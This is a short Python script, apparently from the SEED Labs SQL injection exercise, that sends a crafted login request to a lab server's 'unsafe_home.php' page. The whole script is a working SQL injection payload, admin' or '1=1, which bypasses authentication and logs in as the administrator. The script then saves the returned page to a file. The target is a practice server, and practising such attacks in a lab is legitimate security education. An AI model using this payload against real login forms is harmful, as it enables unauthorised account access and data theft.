
import requests
session=requests.Session()
hackString1="http://www.seed-server.com/unsafe_home.php?username=admin%27+or+%271%3D1&Password="
res=session.get(hackString1)
print(res.text)
with open('response.html','w') as file:
	file.write(res.text)
